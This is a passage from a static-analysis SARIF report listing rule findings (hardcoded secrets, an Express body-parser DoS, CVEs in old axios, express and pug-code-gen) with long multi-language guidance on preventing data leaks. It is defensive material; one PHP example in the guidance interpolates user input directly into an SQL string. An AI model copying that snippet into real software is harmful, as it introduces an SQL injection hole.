                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "note",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "POST Request to Express Body Parser 'bodyParser()' can create Temporary files and consume space."
                            },
                            "help": {
                                "markdown": "POST Request to Express Body Parser 'bodyParser()' can create Temporary files and consume space.\n ## Additional information\n **[CWE-400](https://cwe.mitre.org/data/definitions/400.html)**\n **[OWASP-a6](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a6-Security_Misconfiguration)**",
                                "text": "POST Request to Express Body Parser 'bodyParser()' can create Temporary files and consume space.\n ## Additional information\n **[CWE-400](https://cwe.mitre.org/data/definitions/400.html)**\n **[OWASP-a6](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a6-Security_Misconfiguration)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/400.html",
                            "id": "oss-express-body-parser/21b910fd06e113a74430fcc5ad47c249",
                            "name": "Denial Of Service: Uncontrolled Resource Consumption In Oss Express Body Parser In Server.js",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "2",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 2",
                                    "CWE 400",
                                    "Denial of Service",
                                    "Express",
                                    "OWASP 2021 a05-security-misconfiguration",
                                    "OWASP a05-2021-security-misconfiguration",
                                    "OWASP a6-security-misconfiguration"
                                ]
                            },
                            "shortDescription": {
                                "text": "Denial of Service: Uncontrolled Resource Consumption in OSS Express Body Parser in server.js"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Axios NPM package contains a Server-Side Request Forgery (SSRF) vulnerability where an attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address."
                            },
                            "help": {
                                "markdown": "Axios NPM package contains a Server-Side Request Forgery (SSRF) vulnerability where an attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address.",
                                "text": "Axios NPM package contains a Server-Side Request Forgery (SSRF) vulnerability where an attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/3e11d1559fa82c1184913eaf112dfe07",
                            "name": "Pkg:npm/Axios@0.19.0",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.9",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2020-28168",
                                    "CVSS 5.9",
                                    "CWE 1035",
                                    "CWE 918",
                                    "CWE 937",
                                    "No exploits",
                                    "Reachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/axios@0.19.0"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Versions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs."
                            },
                            "help": {
                                "markdown": "Versions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https://github.com/pillarjs/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.",
                                "text": "Versions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https://github.com/pillarjs/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1286.html",
                            "id": "oss_vuln/3dfd3be3680caf2b71c0479b58e713c3",
                            "name": "Pkg:npm/Express@4.17.1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "6.1",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-29041",
                                    "CVSS 6.1",
                                    "CWE 1035",
                                    "CWE 1286",
                                    "CWE 601",
                                    "CWE 937",
                                    "No exploits",
                                    "Reachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/express@4.17.1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Pug through 3.0.2 allows JavaScript code execution if an application accepts untrusted input for the name option of the `compileClient`, `compileFileClient`, or `compileClientWithDependenciesTracked` function. NOTE: these functions are for compiling Pug templates into JavaScript, and there would typically be no reason to allow untrusted callers."
                            },
                            "help": {
                                "markdown": "Pug through 3.0.2 allows JavaScript code execution if an application accepts untrusted input for the name option of the `compileClient`, `compileFileClient`, or `compileClientWithDependenciesTracked` function. NOTE: these functions are for compiling Pug templates into JavaScript, and there would typically be no reason to allow untrusted callers.",
                                "text": "Pug through 3.0.2 allows JavaScript code execution if an application accepts untrusted input for the name option of the `compileClient`, `compileFileClient`, or `compileClientWithDependenciesTracked` function. NOTE: these functions are for compiling Pug templates into JavaScript, and there would typically be no reason to allow untrusted callers."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/94.html",
                            "id": "oss_vuln/24e4743ba1a27e42475db57aa2cf2e2a",
                            "name": "Pkg:npm/Pug-Code-Gen@2.0.2",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "6.8",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-36361",
                                    "CVSS 6.8",
                                    "CWE 1035",
                                    "CWE 937",
                                    "CWE 94",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/pug-code-gen@2.0.2"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation."
                            },
                            "help": {
                                "markdown": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**",
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/c05778eb8aa8fa46ab99433d865f3203c6db8dd8b68320419d32257e089e3417",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this 